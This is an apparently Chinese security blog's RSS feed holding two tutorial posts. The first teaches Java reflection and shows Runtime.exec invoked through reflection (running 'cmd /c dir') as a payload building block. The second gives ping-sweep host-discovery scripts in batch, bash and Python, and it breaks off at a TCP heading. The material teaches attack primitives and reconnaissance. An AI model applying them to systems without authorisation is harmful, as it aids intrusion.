&lt;p&gt;类加载分为四层，一共有四层 classloader（程序在启动的时候不会一次性加载所有的 class 文件，而是根据程序的需要，通过 Java 的类加载机制来动态加载某个 class 文件到内存中）分别为&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Extension ClassLoader：称为扩展类加载器，负责加载 Java 的扩展库，默认加载 JAVA_HOME/jre/bil/ext 下的所有 class 方法&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;BootStrap ClassLoader：启动类加载器，是 Java 类加载层次顶层的类加载器，负责加载 JDK 中的核心类库，如：&lt;strong&gt;rt.jar、resources.jar、charsets.jar&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package lq;
import java.net.URL;

public class test &amp;#123;
    public static void main(String[] args)&amp;#123;
        URL[] urls = sun.misc.Launcher.getBootstrapClassPath().getURLs();
        for (int i=0 ;i&amp;lt;urls.length;i++)&amp;#123;
            System.out.println(urls[i].toExternalForm());
        &amp;#125;
    &amp;#125;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过上面的代码，获取到该类加载器从哪些地方加载了相关的 jar 和 class 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303212059400.png&#34; alt=&#34;image-20230321205954293&#34; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;App ClassLoader: 系统类加载器。负责加载应用程序 classpath 目录下的所有 jar 和 class 文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Custom ClassLoader：上面三个是 java 默认提供的 classloader，用户可以根据需要自定义自己的 ClassLoader 文件&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;原理介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理介绍&#34;&gt;#&lt;/a&gt; 原理介绍&lt;/h3&gt;
&lt;p&gt;ClassLoader 使用的是双亲委派模型来搜索类，每一个 ClassLoader 实例都有一个父类加载器的引用，当需要搜索某个类的时候，这个过程是从上至下的，首先 Bootstrap ClassLoader 尝试加载如果没有加载到，交由 Extension ClassLoader 尝试加载，没找到交由 APP ClassLoader 尝试加载，如果还是没有加载到这返回给委托的发起者，由其指定（虚拟机内置的类加载器（Bootstrap ClassLoader）本身没有父类加载器，但可以用作其它 ClassLoader 实例的的父类加载器）这里如果都没找到会抛出异常&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ClassLoader&lt;/code&gt;  类有如下核心方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;loadClass&lt;/code&gt; （加载指定的 Java 类）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findClass&lt;/code&gt; （查找指定的 Java 类）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;findLoadedClass&lt;/code&gt; （查找 JVM 已经加载过的类）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;defineClass&lt;/code&gt; （定义一个 Java 类）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;resolveClass&lt;/code&gt; （链接指定的 Java 类）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用这样的模型可以避免重复加载类，夫类已经加载了这个类的时候，没必要子 ClassLoader 在进行一次加载&lt;/p&gt;
&lt;p&gt;Jvm 中两个类是否相同需要同时满足两个条件&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;两个类名相同&lt;/li&gt;
&lt;li&gt;两个类是由同一个 ClassLoader 实例加载的&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;贴一张大佬的图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303212115678.png&#34; alt=&#34;image-20230321211521499&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;反射demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射demo&#34;&gt;#&lt;/a&gt; 反射 demo&lt;/h2&gt;
&lt;p&gt;下面这样一段代码，在参数传入之前不知道他的作用是什么&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public void execute(String className,String methodName) throws Exception&amp;#123;
        Class clazz = Class.forName(className);
        clazz.getMethod(methodName).invoke(clazz.newInstance());
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的示例中利用到了反射中尤为重要的几种方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取类的方法：forName&lt;/li&gt;
&lt;li&gt;实例化类对象的方法：newInstance&lt;/li&gt;
&lt;li&gt;获取函数的方法：getMethod&lt;/li&gt;
&lt;li&gt;执行函数的方法：invoke&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这几个方法包揽了 Java 按去哪里各种和反射有关的 pyaload&lt;/p&gt;
&lt;p&gt;这里记一下 new 一个类对象后都干了什么&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先找到目标类文件并加载到内存中&lt;/li&gt;
&lt;li&gt;执行该类的 static 方法（如果有的话），通过该方法给目标类进行初始化&lt;/li&gt;
&lt;li&gt;在堆内存中开辟空间，分配内存地址&lt;/li&gt;
&lt;li&gt;在堆内存中建立对象特有属性，并进行默认初始化&lt;/li&gt;
&lt;li&gt;对属性进行显示初始化&lt;/li&gt;
&lt;li&gt;对对象进行构造代码块初始化&lt;/li&gt;
&lt;li&gt;对对象进行对应的构造函数初始化&lt;/li&gt;
&lt;li&gt;将内存地址交付给栈内存中定义变量&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;forName 不是获取 “类” 的唯一途径，通常来说我们有如下三种方式获取一个 “类”，也就是 java.lang.class 对象&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;obj.getclass () 如果上下文中存在某个类的示例 obj，那么我们可以通过直接通过 obj.getClass () 来获取类&lt;/li&gt;
&lt;li&gt;Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。&lt;/li&gt;
&lt;li&gt;Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注：在一个 JVM 中，一个类只会有一个 “类对象” 存在&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package demo;

public class demo &amp;#123;
    public String name=&amp;quot;admin&amp;quot;;
    private String passwd=&amp;quot;admin123&amp;quot;;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面通过 getName 来获取类对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package lq;


public class test &amp;#123;
    public static void main(String[] args)&amp;#123;
        String classname=&amp;quot;lq.demo&amp;quot;;
        try&amp;#123;
            Class pClass1 = Class.forName(classname);
            System.out.println(pClass1);

        &amp;#125;catch(ClassNotFoundException e)&amp;#123;
            e.printStackTrace();
        &amp;#125;
    &amp;#125;
&amp;#125;
//class lq.demo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;forName 有两个函数重载&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;class&amp;lt;?&amp;gt; forName(String name)&lt;/li&gt;
&lt;li&gt;class&amp;lt;?&amp;gt; forName(String name,**boolean** initialize,ClassLoader loader)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第一种是我们常用的方法，也就是上面的示例中所使用的方法，可以理解为第二种方式的一个封装，第一个参数是类名，第二个参数标识是否初始化，第三个参数是加载器，高数 javaVM 如何加载这个类&lt;/p&gt;
&lt;p&gt;上面有提到初始化，这里先看一个简单的类&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package lq;

public class demo2 &amp;#123;
    &amp;#123;
        System.out.printf(&amp;quot;Empty block initial %s\n&amp;quot;, this.getClass());
    &amp;#125;
    static &amp;#123;
        System.out.printf(&amp;quot;Static initial %s\n&amp;quot;, demo2.class);
    &amp;#125;
    public demo2() &amp;#123;
        System.out.printf(&amp;quot;Initial %s\n&amp;quot;, this.getClass());
    &amp;#125;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面写一个获取类，运行一下上面的方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package lq;


import jdk.internal.org.objectweb.asm.Handle;

public class test &amp;#123;
    public static void main(String[] args)&amp;#123;
        String classname=&amp;quot;lq.demo2&amp;quot;;
        try&amp;#123;
            Class pClass1 = Class.forName(classname);
            Class pClass2 = demo2.class;
            Class pClass3 = new demo2().getClass();
            System.out.println(pClass2);

        &amp;#125;catch(ClassNotFoundException e)&amp;#123;
            e.printStackTrace();
        &amp;#125;
    &amp;#125;
&amp;#125;
/*
Static initial class lq.demo2
Empty block initial class lq.demo2
Initial class lq.demo2
class lq.demo2
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303170039816.png&#34; alt=&#34;image-20230317003911738&#34; /&gt;&lt;/p&gt;
&lt;p&gt;⾸先调⽤的是 static {} ，其次是 {} ，最后是构造函数，其中， static {} 就是在 “类初始化” 的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super () 后⾯，但在当前构造函数内容的前⾯。所以说， forName 中的 initialize=true 其实就是告诉 Java 虚拟机是否执⾏” 类初始化 “。&lt;/p&gt;
&lt;h2 id=&#34;反射创建对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射创建对象&#34;&gt;#&lt;/a&gt; 反射创建对象&lt;/h2&gt;
&lt;p&gt;在正常情况下，除了系统类，如果我们想要拿到一个类，首先需要 import 才能使用，而使用 forName 就不需要，这样对于我们攻击者来说十分有利的，我们可以加载任意的类&lt;/p&gt;
&lt;p&gt;在一些源码中或许可以看到类名的部分包含 $ 符号，它的作用是查找内部类，java 中如果一个类中编写另一个内，在编译的时候会生成两个文件，通过 Class.forName (&amp;quot;c1$c2&amp;quot;) 就可以加载这个内部类&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;获取类对象： Class classname = Class.fromName(&amp;quot;demo.demo&amp;quot;);
获取构造器对象: Constructor con = class.getConstructor(形参.class);
获取对象：demo demo = con.newInstance(实参)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;写一个 demo 类，添加 6 种构造方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package demo;

public class demo &amp;#123;
    public String name=&amp;quot;admin&amp;quot;;
    public String passwd=&amp;quot;admin123&amp;quot;;

    // 默认
    demo(String str)&amp;#123;
        System.out.println(&amp;quot;(默认)的构造方法 s = &amp;quot;+str);
    &amp;#125;

    //无参的构造方法
    public demo()&amp;#123;
        System.out.println(&amp;quot;调用了公有，无参构造方法&amp;quot;);
    &amp;#125;

    //一个参数的构造方法
    public demo(char name)&amp;#123;
        System.out.println(&amp;quot;姓名：&amp;quot;+name);
    &amp;#125;

    //有多个参数的构造方法
    public demo(String name,String pass)&amp;#123;
        System.out.println(&amp;quot;用户名：&amp;quot;+name+&amp;quot;密码：&amp;quot;+pass);
    &amp;#125;

    //受保护的构造方法
    protected demo(boolean n)&amp;#123;
        System.out.println(&amp;quot;受保护 n = &amp;quot; + n);
    &amp;#125;

    //私有构造方法
    private demo(float pass)&amp;#123;
        System.out.println(&amp;quot;私有的构造方法&amp;quot;+pass);
    &amp;#125;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过反射机制获取对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import java.lang.reflect.Constructor;

public class demo &amp;#123;
public static void main(String[] args) throws Exception&amp;#123;
    Class classname = Class.forName(&amp;quot;demo.demo&amp;quot;);

    System.out.println(&amp;quot;---------所有公有构造方法-----------&amp;quot;);
    Constructor[] conArray = classname.getConstructors();//获取所有“公有的”获取方法
    for(Constructor c:conArray)&amp;#123;
        System.out.println(c);
    &amp;#125;

    System.out.println(&amp;quot;----------所有的构造方法(包括：私有，受保护，默认，，公有)----------&amp;quot;);
    conArray = classname.getDeclaredConstructors();//获取全部的构造方法
    for(Constructor c:conArray)&amp;#123;
        System.out.println(c);
    &amp;#125;

    System.out.println(&amp;quot;----------获取公有的、无参的构造方法----------&amp;quot;);
    Constructor con = classname.getConstructor(null);//获取单个“公有的”构造方法
    //这里的null写不写都行
    System.out.println(&amp;quot;Con = &amp;quot; + con);
    Object obj = con.newInstance();//实例化类对象的方法

    System.out.println(&amp;quot;----------获取私有的构造方法----------&amp;quot;);
    con = classname.getDeclaredConstructor(String.class);//获取构造方法，没有限制
    System.out.println(con);
    con.setAccessible(true);//暴力访问
    obj = con.newInstance(&amp;quot;admin123&amp;quot;);
&amp;#125;
&amp;#125;
/*
---------所有公有构造方法-----------
public demo.demo(java.lang.String,java.lang.String)
public demo.demo(char)
public demo.demo()
----------所有的构造方法(包括：私有，受保护，默认，，公有)----------
private demo.demo(float)
protected demo.demo(boolean)
public demo.demo(java.lang.String,java.lang.String)
public demo.demo(char)
public demo.demo()
demo.demo(java.lang.String)
----------获取公有的、无参的构造方法----------
Con = public demo.demo()
调用了公有，无参构造方法
----------获取私有的构造方法----------
demo.demo(java.lang.String)
(默认)的构造方法 s = admin123
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;获取构造器对象方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;批量的方法：
&lt;ul&gt;
&lt;li&gt;public Constructor [] getConstructors ()：所有” 公有的” 构造方法&lt;/li&gt;
&lt;li&gt;public Constructor [] getDeclaredConstructors ()：获取所有的构造方法 (包括私有、受保护、默认公有)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;获取单个的方法:
&lt;ol&gt;
&lt;li&gt;public Constructor getConstructor (Class…parameterTypes): 获取单个的” 公有的” 构造方法&lt;/li&gt;
&lt;li&gt;public Constructor getDeclaredConstructor (Class…parameterTypes): 获取” 某个构造方法” 可以是私有的，或受保护、默认、公有；&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这里在记录几个常用的函数&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;class.newInstance () 的作用就是调用这个类的无参构造函数&lt;/li&gt;
&lt;li&gt;getMethod 的作用是通过反射获取一个类的某个特定的公有方法。&lt;/li&gt;
&lt;li&gt;invoke 的作用是执行方法&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;反射javalangruntime&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反射javalangruntime&#34;&gt;#&lt;/a&gt; 反射 java.lang.Runtime&lt;/h2&gt;
&lt;p&gt;Runtime 没法直接 new，通过下面的方式创建这个对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class demo &amp;#123;
    public static void main(String[] args)&amp;#123;
    Runtime runtime = Runtime.getRuntime();
    System.out.println(runtime);
    &amp;#125;
&amp;#125;
//java.lang.Runtime@1b6d3586
//1b6d3586这个是对象在内存中地址的16进制
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面是常用的几种方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;freeMemory ()：Return JVM 的空闲内存量，以字节为单位。&lt;/li&gt;
&lt;li&gt;maxMemory ()：Return JVM 试图使用的最大内存量。&lt;/li&gt;
&lt;li&gt;totalMemory ()：Return JVM 中的内存总量。&lt;/li&gt;
&lt;li&gt;availableProcessors () :Return JVM 的处理器数量&lt;/li&gt;
&lt;li&gt;exit (int status): 通过启动其关闭序列来终止当前正在运行的 JVM&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;代码演示&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class demo &amp;#123;
    public static void main(String[] args)&amp;#123;
    Runtime runtime = Runtime.getRuntime();
    System.out.println(runtime);
    System.out.println(&amp;quot;JVM中的空闲内存量&amp;quot;+runtime.freeMemory());
    System.out.println(&amp;quot;JVM试图使用的最大内存量&amp;quot;+runtime.maxMemory());
    System.out.println(&amp;quot;JVM中内存总量&amp;quot;+runtime.totalMemory());
    System.out.println(&amp;quot;JVM的处理器数量&amp;quot;+runtime.availableProcessors());
    &amp;#125;
&amp;#125;
//java.lang.Runtime@1b6d3586
//        JVM中的空闲内存量250001304
//        JVM试图使用的最大内存量3784310784
//        JVM中内存总量255328256
//        JVM的处理器数量12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样看来 Runtime 似乎在安全方面没有太大的影响，实际上 java.lang.runtime 有一个 exec 方法可以执行本地命令，所以在很多的 payload 都会看到 Runtime 的身影，通过反射调用 Runtime 来执行本地系统命令&lt;/p&gt;
&lt;p&gt;首先是不使用反射执行本地命令&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class demo &amp;#123;
    public static void main(String[] args) throws IOException &amp;#123;
        // 使用 Runtime 类的 exec() 方法在本地系统上执行命令
        Process process = Runtime.getRuntime().exec(&amp;quot;cmd /c dir&amp;quot;);
        // 使用 BufferedReader 和 InputStreamReader 读取命令的输出
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        // 逐行读取命令的输出，并打印到控制台上
        String line;
        while ((line = reader.readLine()) != null) &amp;#123;
            System.out.println(line);
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303261401582.png&#34; alt=&#34;image-20230326140122498&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

public class demo &amp;#123;
    public static void main(String[] args) throws Exception&amp;#123;
        // 获取Runtime类的Class对象
        Class RunClass = Class.forName(&amp;quot;java.lang.Runtime&amp;quot;);
        // 获取Runtime类的getRuntime方法
        Method getRuntimeMethod = RunClass.getMethod(&amp;quot;getRuntime&amp;quot;);
        // 调用getRuntime方法获取Runtime类的实例
        Object runtimeObjetct = getRuntimeMethod.invoke(null);

        // 获取Runtime类的exec方法
        Method exec = RunClass.getMethod(&amp;quot;exec&amp;quot;, String.class);
        // 调用exec方法执行系统命令
        Process process = (Process) exec.invoke(runtimeObjetct,&amp;quot;cmd /c dir&amp;quot;);
        // 获取进程的标准输出流
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        // 逐行读取命令的输出，并打印到控制台上
        String line;
        while ((line = reader.readLine()) != null) &amp;#123;
            System.out.println(line);
        &amp;#125;
    &amp;#125;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303261427357.png&#34; alt=&#34;image-20230326142727290&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
            <title>主动信息收集</title>
            <link>https://blog.xcu.icu/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
            <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
            <category term="主动信息收集" scheme="https://blog.xcu.icu/tags/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
            <pubDate>Mon, 20 Mar 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;主动信息收集是指与目标主机进行交互，从而获取所需要的目标信息，常见的主动信息收集包括：敏感目录，端口信息探测，系统版本，CMS 类型，服务器版本等&lt;/p&gt;
&lt;h2 id=&#34;icmp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#icmp&#34;&gt;#&lt;/a&gt; ICMP&lt;/h2&gt;
&lt;p&gt;ICMP 是网络控制报文协议，属于网络层，用于在 IP 主机，路由之间传递控制消息，尝尝被称为 “错误侦测与回报机制”，能够检测网路的连线状态，确保连线的准确性。&lt;/p&gt;
&lt;h3 id=&#34;ping命令的功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ping命令的功能&#34;&gt;#&lt;/a&gt; Ping 命令的功能&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;网络状态诊断：向特定的目的主机发送请求报文，测试目的站是否可达以及了解其工作状态&lt;/li&gt;
&lt;li&gt;探测主句存活：向特定的目的主机发送请求报文，如果目标主机返回应答数据包，则表达主机存活&lt;/li&gt;
&lt;li&gt;识别系统类别：向特定的目的主机发送请求报文，返回的 TTL 值可以判断目标主机系统类型&lt;/li&gt;
&lt;li&gt;查看域名对应的 ip 地址：Ping 域名，可返回该域名多对应的 ip 地址信息&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;功能概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#功能概述&#34;&gt;#&lt;/a&gt; 功能概述&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;request time out
&lt;ol&gt;
&lt;li&gt;目标已关机&lt;/li&gt;
&lt;li&gt;对方与自己不在同一网段内&lt;/li&gt;
&lt;li&gt;设置了 ICMP 数据包过滤&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Destination host Unreachable
&lt;ol&gt;
&lt;li&gt;网线出了故障&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Source quench received
&lt;ol&gt;
&lt;li&gt;表示对方或者中途服务器繁忙无法回应&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;unknown host name
&lt;ol&gt;
&lt;li&gt;DNS 配置不正确&lt;/li&gt;
&lt;li&gt;域名不正确&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;no rout to host
&lt;ol&gt;
&lt;li&gt;网卡工作不正常&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;transmit fai led，error code
&lt;ol&gt;
&lt;li&gt;10043 网卡驱动错误&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;TTL 值：Time To Live，表示 DNS 记录在 DNS 服务器上存在的时间，它是 IP 协议包的一个值，告诉路由器该数据何时需要被丢弃&lt;/p&gt;
&lt;p&gt;实际上是 Ip 数据包在计算机网络中可以转发的最大跳数 (有 IP 数据包的发送者设置)，在整个转发路径上，每经过一个路由都会修改这个 TTL 字段值，具体的做法就是减一，然后再将 IP 包转发出去&lt;/p&gt;
&lt;p&gt;通过 ping 返回的 TTL 值的大小可以粗略的判断目标主机的系统类型，默认情况下 Linux 为 64 或 255，win 系列是 128，unix 是 255&lt;/p&gt;
&lt;h3 id=&#34;icmp主机探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#icmp主机探测&#34;&gt;#&lt;/a&gt; ICMP 主机探测&lt;/h3&gt;
&lt;h3 id=&#34;windows-bat脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows-bat脚本&#34;&gt;#&lt;/a&gt; Windows-bat 脚本&lt;/h3&gt;
&lt;p&gt;首先先记录一些 bash 语法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;echo off：关闭其他所有命令的回显&lt;/li&gt;
&lt;li&gt;@：关闭紧跟其后的一条命令的回显&lt;/li&gt;
&lt;li&gt;set/p ：在屏幕中输出信息（不换行），并接受用户输入的内容，赋值给 ip&lt;/li&gt;
&lt;li&gt;for  /L：for 循环以增量的形式从开始到结束&lt;/li&gt;
&lt;li&gt;% name%：用 % 将要调用的变量包起来就可以调用这个变量&lt;/li&gt;
&lt;li&gt;%% name：表示 name 为 for 里面的循环量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ping 命令使用的帮助信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-n：count 发送的回显请求数&lt;/li&gt;
&lt;li&gt;-l：发送缓冲区大小&lt;/li&gt;
&lt;li&gt;-w：每次等待回复的超时时间（毫秒）&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;@echo off
set /p ip=&amp;quot;请输入IP地址段，格式如：&amp;quot;192.168.1.&amp;quot; &amp;gt;&amp;gt;&amp;gt; &amp;quot;
for /L %%i in (1,1,254) do (
Ping.exe -n 1 -l 16 -w 100 %ip%%%i |findstr TTL=  &amp;gt;nul &amp;amp;&amp;amp; echo %ip%%%i is up. || echo %ip%%%i is down.
)
echo 检测ping完成！&amp;amp; pause
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;linux-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux-shell&#34;&gt;#&lt;/a&gt; Linux-shell&lt;/h3&gt;
&lt;p&gt;还是先记录用到的一些写法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/bin/bash：利用 /bin/bash 执行 shell 脚本&lt;/li&gt;
&lt;li&gt;read：用于读取用户输入的字符&lt;/li&gt;
&lt;li&gt;for：for 循环以增量形式从开始到结束&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
$ip
read -p &amp;quot;please inpur ip :&amp;quot; ip
for((i=0;i&amp;lt;=255;i++)); do
	ping -c 1 -W 0.1   $ip$i &amp;gt; /dev/null &amp;amp;&amp;amp; echo &amp;quot;$ip$i is up.&amp;quot; || echo &amp;quot;$ip$i is down.&amp;quot;
done
echo &amp;quot;检测ping完成&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;python代码实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python代码实现&#34;&gt;#&lt;/a&gt; python 代码实现&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python
#coding:utf-8
from scapy.all import *
from random import randint
from optparse import OptionParser

def Scan(ip):
    ip_id = randint(1, 65535)
    icmp_id = randint(1, 65535)
    icmp_seq = randint(1, 65535)
    packet=IP(dst=ip,ttl=64,id=ip_id)/ICMP(id=icmp_id,seq=icmp_seq)/b&#39;rootkit&#39;
    result = sr1(packet, timeout=1, verbose=False)
    if result:
        for rcv in result:
            scan_ip = rcv[IP].src
            print(scan_ip + &#39;---&amp;gt;&#39; &#39;Host is up&#39;)
    else:
        print(ip + &#39;---&amp;gt;&#39; &#39;host is down&#39;)

def main():
    parser = OptionParser(&amp;quot;Usage:%prog -i &amp;lt;target host&amp;gt; &amp;quot;)   # 输出帮助信息
    parser.add_option(&#39;-i&#39;,type=&#39;string&#39;,dest=&#39;IP&#39;,help=&#39;specify target host&#39;)   # 获取ip地址参数
    options,args = parser.parse_args()
    print(&amp;quot;Scan report for &amp;quot; + options.IP + &amp;quot;\n&amp;quot;)
    # 判断是单台主机还是多台主机
    # ip中存在-,说明是要扫描多台主机
    if &#39;-&#39; in options.IP:
    # 代码意思举例：192.168.1.1-120
    # 通过&#39;-&#39;进行分割，把192.168.1.1和120进行分离
    # 把192.168.1.1通过&#39;,&#39;进行分割,取最后一个数作为range函数的start,然后把120+1作为range函数的stop
    # 这样循环遍历出需要扫描的IP地址
        for i in range(int(options.IP.split(&#39;-&#39;)[0].split(&#39;.&#39;)[3]), int(options.IP.split(&#39;-&#39;)[1]) + 1):
            Scan(
            options.IP.split(&#39;.&#39;)[0] + &#39;.&#39; + options.IP.split(&#39;.&#39;)[1] + &#39;.&#39; + options.IP.split(&#39;.&#39;)[
                2] + &#39;.&#39; + str(i))
            time.sleep(0.2)
    else:
        Scan(options.IP)

    print(&amp;quot;\nScan finished!....\n&amp;quot;)

if __name__ == &amp;quot;__main__&amp;quot;:
    try:
        main()
    except KeyboardInterrupt:
        print(&amp;quot;interrupted by user, killing all threads...&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;tcpudp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcpudp&#34;&gt;#&lt;/a&gt; TCP&amp;amp;UDP&lt;/h2&gt;
&lt;p&gt;传输层主要负责向两个主机中进程之间的通信提供服务。包括：传输控制协议（TCP）和用户数据报协议（UDP）&lt;/p&gt;
&lt;h3 id=&#34;概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概述&#34;&gt;#&lt;/a&gt; 概述&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;TCP&lt;br /&gt;
 为两台计算机之间提供面向连接、可靠的字节流服务。一台计算机发出的字节流无差错地发往网络上的其他计算机，由于其可靠的传输方式，故传输速度较慢。&lt;/li&gt;
&lt;li&gt;UDP&lt;br /&gt;
 是一个简单的面向数据报的传输层协议。提供的是非面向连接的、不可靠的数据流传输。UDP 在传输数据报前不用在客户和服务器之间建立一个连接，且没有超时重发等机制，故传输速度很快。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;tcp探测存活主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcp探测存活主机&#34;&gt;#&lt;/a&gt; TCP 探测存活主机&lt;/h3&gt;
&lt;p&gt;tcp 报文&lt;/p&gt;
